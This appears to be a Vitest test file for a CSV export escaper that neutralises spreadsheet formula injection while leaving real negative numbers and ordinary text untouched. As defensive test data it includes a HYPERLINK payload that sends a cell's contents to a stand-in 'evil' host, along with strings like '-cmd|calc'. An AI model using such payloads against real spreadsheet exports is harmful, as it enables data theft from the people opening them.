import { describe, it, expect } from 'vitest';
import { escapeCsv, csvRow } from './csv';

describe('escapeCsv — formula neutralisation', () => {
  /**
   * The attack this exists for. /api/webhooks/inbound is public and inserts
   * leads with caller-supplied names, so this string can reach the database
   * without an account, and only becomes live code when an admin opens the
   * export.
   */
  it('neutralises a HYPERLINK exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil/?"&A1,"click")';
    const out = escapeCsv(payload);
    expect(out.startsWith('"\'=')).toBe(true);
    // The apostrophe must come BEFORE the =, or the spreadsheet still evaluates.
    expect(out.indexOf("'")).toBeLessThan(out.indexOf('='));
  });

  it('neutralises every formula-opening character', () => {
    for (const c of ['=', '+', '@', '\t', '\r']) {
      expect(escapeCsv(`${c}cmd`), c).toContain(`'${c}cmd`);
    }
  });

  it('neutralises a leading minus that is not a number', () => {
    expect(escapeCsv('-1+1')).toBe("'-1+1");
    expect(escapeCsv('-cmd|calc')).toBe("'-cmd|calc");
  });

  /**
   * The reason this is not a blanket rule. '-' opens both a formula and every
   * negative number, and escaping a real -1500 deal value would turn it into
   * text, breaking sorting and arithmetic for a value that was never dangerous.
   */
  it('leaves genuine negative numbers alone', () => {
    expect(escapeCsv('-1500')).toBe('-1500');
    expect(escapeCsv(-1500)).toBe('-1500');
    expect(escapeCsv('-0.75')).toBe('-0.75');
    expect(escapeCsv('+42')).toBe('+42');
  });

  it('does not touch ordinary text', () => {
    expect(escapeCsv('Jane Smith')).toBe('Jane Smith');
    expect(escapeCsv('1421 E Palm Ln')).toBe('1421 E Palm Ln');
    // Only a LEADING formula character matters.
    expect(escapeCsv('A=B')).toBe('A=B');
    expect(escapeCsv('jane@example.com')).toBe('jane@example.com');
  });
});

describe('escapeCsv — CSV formatting', () => {
  it('quotes values containing a comma', () => {
    expect(escapeCsv('Smith, Jane')).toBe('"Smith, Jane"');
  });

  it('doubles embedded quotes', () => {
    expect(escapeCsv('the "big" one')).toBe('"the ""big"" one"');
  });

  it('quotes newlines and carriage returns', () => {
    expect(escapeCsv('line1\nline2')).toBe('"line1\nline2"');
    expect(escapeCsv('a\rb')).toBe('"a\rb"');
  });

  it('renders null and undefined as empty', () => {
    expect(escapeCsv(null)).toBe('');
    expect(escapeCsv(undefined)).toBe('');
  });

  it('keeps an empty string empty', () => {
    expect(escapeCsv('')).toBe('');
  });

  // Both problems at once: a formula payload that also contains a comma.
  it('applies both escapes together, in the right order', () => {
    expect(escapeCsv('=SUM(A1,B1)')).toBe('"\'=SUM(A1,B1)"');
  });
});

describe('csvRow', () => {
  it('joins values with commas', () => {
    expect(csvRow(['Jane', 'Smith', '555'])).toBe('Jane,Smith,555');
  });

  it('escapes each cell independently', () => {
    // Only the middle cell needs quoting — it has a comma. The formula cell is
    // neutralised by the apostrophe alone, and quoting it would be noise.
    expect(csvRow(['=evil()', 'Smith, Jane', null])).toBe('\'=evil(),"Smith, Jane",');
  });
});
